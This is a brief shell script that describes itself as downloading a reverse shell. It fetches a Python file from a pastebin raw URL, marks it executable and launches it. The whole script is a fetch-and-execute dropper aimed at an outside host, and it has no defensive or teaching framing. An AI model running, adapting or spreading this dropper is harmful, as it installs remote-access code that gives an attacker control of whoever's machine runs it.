#!/bin/sh

# Define URLs and file paths
kupaTroopaUrl="https://pastebin.com/raw/bPWB8Tu1"
kupaTroopa="deployPer.py"

# Download the reverse shell
echo "Downloading KupaTroopa..."
curl "$kupaTroopaUrl" -o "$kupaTroopa"
if [ $? -eq 0 ]; then
    echo "Troopa shell caught"
else
    echo "Shell was missed"
    exit 1
fi

# Make the downloaded file executable
chmod +x "$kupaTroopa"

# Launch the file
echo "Roaming"
xdg-open "$kupaTroopa" & read -p "Press any key to exit..."
